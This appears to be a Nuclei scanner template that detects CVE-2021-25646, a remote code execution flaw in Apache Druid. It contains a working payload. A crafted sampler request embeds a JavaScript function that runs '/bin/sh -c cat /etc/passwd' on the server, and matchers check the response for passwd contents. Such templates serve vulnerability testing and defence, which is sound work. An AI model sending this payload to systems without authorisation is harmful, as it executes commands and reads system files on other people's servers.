http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - numRowsRead
    - numRowsIndexed
  - part: header
    type: word
    words:
    - application/json
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\"\
    ,\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"\
    /etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n\
    \      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\"\
    :{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n\
    \            },\n            \"dimensionsSpec\":{\n\n            },\n        \
    \    \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\
    \"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\
    \"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\"\
    ,\n            \"\":{\n               \"enabled\":\"true\"\n            }\n  \
    \       }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}\n"
id: CVE-2021-25646
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:apache:druid:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-25646
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-732
    epss-percentile: 0.99887
    epss-score: 0.94031
  description: 'Apache Druid is susceptible to remote code execution because by default
    it lacks authorization and authentication. Attackers can send specially crafted
    requests to execute arbitrary code with the privileges of processes on the Druid
    server.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 1
    product: druid
    vendor: apache
  name: Apache Druid - Remote Code Execution
  reference:
  - https://paper.seebug.org/1476/
  - https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  - http://www.openwall.com/lists/oss-security/2021/01/29/6
  - https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25864
  remediation: 'Apply the latest security patches or upgrade to a patched version
    of Apache Druid.

    '
  severity: high
  tags: cve2021,cve,apache,rce,druid,vkev,vuln
